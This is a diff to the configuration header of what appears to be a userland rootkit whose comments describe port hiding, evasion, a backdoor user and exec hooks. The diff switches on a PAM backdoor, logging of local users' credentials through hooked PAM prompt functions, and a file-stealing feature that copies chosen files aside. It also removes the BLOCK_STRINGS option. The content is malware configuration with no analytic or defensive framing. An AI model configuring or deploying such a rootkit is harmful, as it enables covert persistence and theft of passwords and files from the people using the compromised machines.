@@ -16,7 +16,7 @@
  * causing problems. */
 
 /* requires PAM */
-#undef USE_PAM_BD
+#define USE_PAM_BD
 
 /* no mandatory dependencies unless you choose to use SSL.
  * i'd have to discourage trying to use this for the time
@@ -32,7 +32,6 @@
 #define HIDE_PORTS //ignore
 #define DO_REINSTALL //ignore
 #define DO_EVASIONS //ignore
-#define BLOCK_STRINGS //ignore
 
 /* this defines whether or not a backdoor user can hide & unhide
  * files on-the-fly via the exec hooks. (execve & execvp)
@@ -42,7 +41,7 @@
 /* requires PAM. logs successful user authentications by hooking
  * the pam_prompt functions and writing respective user credentials
  * to the determined log file. */
-#undef LOG_LOCAL_AUTH
+#define LOG_LOCAL_AUTH
 
 /* when this is defined, outgoing ssh connections are logged.
  * the respective host, username and password used are written to
@@ -57,7 +56,7 @@
  * hooks/open/consts. (etc/defaults.sh defines the path itself)
  * the files that are of interest to us are defined in
  * hooks/open/char_arrays. */
-#undef FILE_STEAL
+#define FILE_STEAL
 /* when this is defined w/ FILE_STEAL, when an attempt to
  * steal a file by copying it to its new path fails,
  * attempt to make a new link in the interesting dir for
